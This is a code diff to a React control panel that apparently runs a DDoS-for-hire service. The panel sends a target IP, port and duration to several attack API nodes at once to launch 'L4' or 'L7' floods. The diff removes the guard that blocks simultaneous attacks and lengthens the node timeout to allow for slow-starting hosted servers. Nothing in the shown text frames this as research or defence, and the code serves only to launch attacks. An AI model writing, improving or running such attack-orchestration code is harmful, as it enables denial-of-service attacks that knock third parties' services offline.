@@ -188,24 +188,6 @@ export default function Panel() {
       return;
     }
 
-    // Re-check busy state right before firing
-    if (layer === "L4") {
-      const { data: busy } = await supabase.rpc("is_l4_busy");
-      if (busy) {
-        setLaunchError("An L4 attack is already in progress. Wait for it to finish.");
-        setL4Busy(true);
-        return;
-      }
-    }
-    if (layer === "L7") {
-      const { data: busy } = await supabase.rpc("is_l7_busy");
-      if (busy) {
-        setLaunchError("An L7 attack is already in progress. Wait for it to finish.");
-        setL7Busy(true);
-        return;
-      }
-    }
-
     setLaunchError("");
     setLaunchInfo("");
     setLaunching(true);
@@ -221,11 +203,12 @@ export default function Panel() {
             ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
             : { method: 2, ip: target.trim(), time: duration };
 
-        // Fire all API nodes simultaneously with a 5 s timeout each
+        // Fire all API nodes simultaneously with a 15 s timeout each
+        // (Replit dev servers can take 10-30 s to cold-start)
         const results = await Promise.allSettled(
           apis.map((api) => {
             const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), 5000);
+            const timer = setTimeout(() => controller.abort(), 15000);
             return fetch(`${api.url}/api/hit`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
